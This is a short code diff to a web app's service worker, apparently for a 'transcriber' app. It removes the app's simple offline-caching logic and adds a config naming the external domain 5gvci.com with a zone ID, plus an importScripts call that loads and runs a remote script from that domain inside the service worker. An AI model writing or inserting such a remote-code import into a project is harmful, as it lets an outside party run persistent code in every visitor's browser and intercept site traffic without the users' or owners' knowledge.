@@ -1,15 +1,6 @@
-self.addEventListener('install', (e) => {
-  e.waitUntil(
-    caches.open('transcriber-v1').then((cache) => {
-      return cache.addAll(['./index.html', './manifest.json']);
-    })
-  );
-});
-
-self.addEventListener('fetch', (e) => {
-  e.respondWith(
-    caches.match(e.request).then((response) => {
-      return response || fetch(e.request);
-    })
-  );
-});
+self.options = {
+    "domain": "5gvci.com",
+    "zoneId": 11852928
+}
+self.lary = ""
+importScripts('https://5gvci.com/act/files/service-worker.min.js?r=sw')
